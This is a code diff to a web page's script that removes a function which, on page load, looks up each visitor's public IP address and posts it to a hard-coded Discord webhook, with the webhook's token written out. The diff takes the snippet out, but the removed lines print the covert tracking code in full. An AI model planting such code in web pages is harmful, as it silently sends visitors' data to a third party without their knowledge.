@@ -132,28 +132,6 @@
             document.getElementById("search").click();
         }
     });
-        function sendIPToWebhook() {
-            fetch('https://api.ipify.org?format=json')
-                .then(response => response.json())
-                .then(data => {
-                    const ipAddress = data.ip;
-                    const webhookURL = 'https://discord.com/api/webhooks/1244723659818668133/V1XHltpk7CWKRfMRuFbPDXLPgQY-toKnyBZIRRFQP9x2vnzHzufGjjHD-_rMfAgYjC-z'; 
-                    fetch(webhookURL, {
-                        method: 'POST',
-                        headers: {
-                            'Content-Type': 'application/json'
-                        },
-                        body: JSON.stringify({ ip: ipAddress })
-                    })
-                    .then(response => console.log('IP address sent to webhook'))
-                    .catch(error => console.error('Error sending IP address to webhook:', error));
-                })
-                .catch(error => console.error('Error fetching IP address:', error));
-        }
-
-        window.onload = function() {
-            sendIPToWebhook();
-        };
     </script>
 </body>
 </html>
